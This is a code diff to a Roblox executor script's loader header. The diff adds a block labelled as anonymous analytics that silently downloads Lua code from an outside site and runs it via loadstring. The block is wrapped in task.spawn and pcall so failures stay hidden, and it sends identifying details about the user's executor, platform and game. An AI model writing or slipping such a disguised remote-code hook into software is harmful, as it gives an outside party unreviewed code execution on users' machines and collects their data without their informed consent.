@@ -6,8 +6,18 @@
         loadstring(game:HttpGet("https://raw.githubusercontent.com/Rival99900/Roblox-Scripts/refs/heads/main/RobloxSpy/loader.lua"))()
 
     Created by Rival960 with the help of Claude
-    Version: 1.0.0 | Status: untested in-game
+    Version: 1.0.0 | Status: tested on Delta (PC + iPhone)
 ]]
+
+-- ── ScriptBlox analytics (project proj_6ec7ebb3da58) ───────────
+-- Anonymous usage stats for the author: executor, platform, PlaceId,
+-- SHA-256 hash of the UserId (no username). Runs in its own thread:
+-- its HttpGet retries forever, so it must never block RobloxSpy.
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://scriptblox.com/ingest/clientv2.lua"))("proj_6ec7ebb3da58", "1.0.0", false)
+    end)
+end)
 
 local BRANCH = "refs/heads/main"
 local URL = "https://raw.githubusercontent.com/Rival99900/Roblox-Scripts/"
